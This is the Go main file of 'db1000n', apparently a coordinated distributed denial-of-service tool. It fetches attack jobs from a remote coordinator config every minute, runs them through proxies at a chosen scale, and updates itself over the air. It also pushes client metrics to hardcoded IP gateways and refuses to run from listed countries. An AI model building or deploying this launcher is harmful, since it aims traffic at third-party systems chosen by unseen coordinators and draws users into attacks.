// MIT License

// Copyright (c) [2022] [Bohdan Ivashko (https://github.com/Arriven)]

// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:

// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.

// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

package main

import (
	"context"
	"flag"
	"log"
	"math/rand"
	"net/http"
	pprofhttp "net/http/pprof"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"

	"github.com/google/uuid"
	"go.uber.org/zap"

	"github.com/Arriven/db1000n/src/jobs"
	"github.com/Arriven/db1000n/src/runner"
	"github.com/Arriven/db1000n/src/runner/config"
	"github.com/Arriven/db1000n/src/utils"
	"github.com/Arriven/db1000n/src/utils/metrics"
	"github.com/Arriven/db1000n/src/utils/ota"
	"github.com/Arriven/db1000n/src/utils/updater"
)

func main() {
	log.SetOutput(os.Stdout)
	log.SetFlags(log.Ldate | log.Lmicroseconds | log.Lshortfile | log.LUTC)
	log.Printf("DB1000n [Version: %s][PID=%d]\n", ota.Version, os.Getpid())

	// Config
	configPaths := flag.String("c",
		utils.GetEnvStringDefault("CONFIG", "https://raw.githubusercontent.com/db1000n-coordinators/LoadTestConfig/main/config.v0.7.json"),
		"path to config files, separated by a comma, each path can be a web endpoint")
	backupConfig := flag.String("b", config.DefaultConfig, "raw backup config in case the primary one is unavailable")
	configFormat := flag.String("format", utils.GetEnvStringDefault("CONFIG_FORMAT", "yaml"), "config format")
	refreshTimeout := flag.Duration("refresh-interval", utils.GetEnvDurationDefault("REFRESH_INTERVAL", time.Minute),
		"refresh timeout for updating the config")

	// Proxying
	systemProxy := flag.String("proxy", utils.GetEnvStringDefault("SYSTEM_PROXY", ""),
		"system proxy to set by default (can be a comma-separated list or a template)")

	// Jobs
	scaleFactor := flag.Int("scale", utils.GetEnvIntDefault("SCALE_FACTOR", 1),
		"used to scale the amount of jobs being launched, effect is similar to launching multiple instances at once")
	skipEncrytedJobs := flag.Bool("skip-encrypted", utils.GetEnvBoolDefault("SKIP_ENCRYPTED", false),
		"set to true if you want to only run plaintext jobs from the config for security considerations")
	enablePrimitiveJobs := flag.Bool("enable-primitive", utils.GetEnvBoolDefault("ENABLE_PRIMITIVE", true),
		"set to true if you want to run primitive jobs that are less resource-efficient")

	// Prometheus
	prometheusOn := flag.Bool("prometheus_on", utils.GetEnvBoolDefault("PROMETHEUS_ON", true),
		"Start metrics exporting via HTTP and pushing to gateways (specified via <prometheus_gateways>)")
	prometheusPushGateways := flag.String("prometheus_gateways",
		utils.GetEnvStringDefault("PROMETHEUS_GATEWAYS", "https://178.62.78.144:9091,https://46.101.26.43:9091,https://178.62.33.149:9091"),
		"Comma separated list of prometheus push gateways")

	// OTA
	otaConfig := ota.NewConfigWithFlags()

	// Config updater
	updaterMode := flag.Bool("updater-mode", utils.GetEnvBoolDefault("UPDATER_MODE", false), "Only run config updater")
	destinationConfig := flag.String("updater-destination-config", utils.GetEnvStringDefault("UPDATER_DESTINATION_CONFIG", "config/config.json"),
		"Destination config file to write (only applies if updater-mode is enabled")

	// Country check
	countryList := flag.String("country-list", utils.GetEnvStringDefault("COUNTRY_LIST", "Ukraine"), "comma-separated list of countries")
	strictCountryCheck := flag.Bool("strict-country-check", utils.GetEnvBoolDefault("STRICT_COUNTRY_CHECK", false),
		"enable strict country check; will also exit if IP can't be determined")

	// Misc
	debug := flag.Bool("debug", utils.GetEnvBoolDefault("DEBUG", false), "enable debug level logging")
	pprof := flag.String("pprof", utils.GetEnvStringDefault("GO_PPROF_ENDPOINT", ""), "enable pprof")
	help := flag.Bool("h", false, "print help message and exit")

	flag.Parse()

	switch {
	case *help:
		flag.CommandLine.Usage()

		return
	case *updaterMode:
		updater.Run(*destinationConfig, strings.Split(*configPaths, ","), []byte(*backupConfig))

		return
	}

	logger, err := newZapLogger(*debug)
	if err != nil {
		log.Fatalf("failed to initialize Zap logger: %v", err)
	}

	go ota.WatchUpdates(otaConfig)
	setUpPprof(*pprof, *debug)
	rand.Seed(time.Now().UnixNano())

	clientID := uuid.NewString()
	country := checkCountryOrFail(strings.Split(*countryList, ","), *strictCountryCheck)

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	initMetricsOrFail(ctx, *prometheusOn, *prometheusPushGateways, clientID, country)

	r, err := runner.New(&runner.Config{
		ConfigPaths:    strings.Split(*configPaths, ","),
		BackupConfig:   []byte(*backupConfig),
		RefreshTimeout: *refreshTimeout,
		Format:         *configFormat,
		Global: jobs.GlobalConfig{
			ProxyURLs:           *systemProxy,
			ScaleFactor:         *scaleFactor,
			SkipEncrypted:       *skipEncrytedJobs,
			Debug:               *debug,
			ClientID:            clientID,
			EnablePrimitiveJobs: *enablePrimitiveJobs,
		},
	})
	if err != nil {
		log.Panicf("Error initializing runner: %v", err)
	}

	go cancelOnSignal(cancel)
	r.Run(ctx, logger)
}

func newZapLogger(debug bool) (*zap.Logger, error) {
	if debug {
		return zap.NewDevelopment()
	}

	return zap.NewProduction()
}

func setUpPprof(pprof string, debug bool) {
	if debug && pprof == "" {
		pprof = ":8080"
	}

	if pprof == "" {
		return
	}

	mux := http.NewServeMux()
	mux.Handle("/debug/pprof/", http.HandlerFunc(pprofhttp.Index))
	mux.Handle("/debug/pprof/cmdline", http.HandlerFunc(pprofhttp.Cmdline))
	mux.Handle("/debug/pprof/profile", http.HandlerFunc(pprofhttp.Profile))
	mux.Handle("/debug/pprof/symbol", http.HandlerFunc(pprofhttp.Symbol))
	mux.Handle("/debug/pprof/trace", http.HandlerFunc(pprofhttp.Trace))

	go func() {
		log.Println(http.ListenAndServe(pprof, mux))
	}()
}

func checkCountryOrFail(blacklist []string, strict bool) string {
	isCountryAllowed, country := utils.CheckCountry(blacklist, strict)
	if !isCountryAllowed {
		log.Fatalf("%q is not an allowed country, exiting", country)
	}

	return country
}

func initMetricsOrFail(ctx context.Context, prometheusOn bool, prometheusPushGateways, clientID, country string) {
	if !metrics.ValidatePrometheusPushGateways(prometheusPushGateways) {
		log.Fatal("Invalid value for --prometheus_gateways")
	}

	if prometheusOn {
		metrics.InitMetrics(clientID, country)

		go metrics.ExportPrometheusMetrics(ctx, prometheusPushGateways)
	}
}

func cancelOnSignal(cancel context.CancelFunc) {
	sigs := make(chan os.Signal, 1)
	signal.Notify(sigs,
		syscall.SIGTERM,
		syscall.SIGABRT,
		syscall.SIGHUP,
		syscall.SIGINT,
	)
	<-sigs
	log.Println("Terminating")
	cancel()
}
